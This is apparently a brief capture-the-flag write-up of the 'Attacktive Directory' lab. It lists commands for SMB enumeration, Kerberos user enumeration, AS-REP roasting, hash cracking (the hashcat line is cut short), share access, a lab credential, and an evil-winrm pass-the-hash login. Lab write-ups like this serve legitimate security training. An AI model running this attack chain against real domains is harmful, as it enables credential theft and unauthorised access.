# Attacktive Directory

### Enumeration

```bash
enum4linux 10.10.176.12
```

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption><p>scanning port 139/445</p></figcaption></figure>

kerbrute

```powershell
 ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.176.12  userlist.txt 
```

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

impacket-GetNPUsers

```bash
impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.10.176.12
```

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

hashcat

```
hashcat -m 18
```

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### smbclient

```
smbclient -L //10.10.176.12  -U "svc-admin"
```

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```bash
smb://ip/backup
```

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
backup@spookysec.local:backup2517860
{% endhint %}



<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



```bash
evil-winrm -u <user> -H "hash" -i ip
```

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
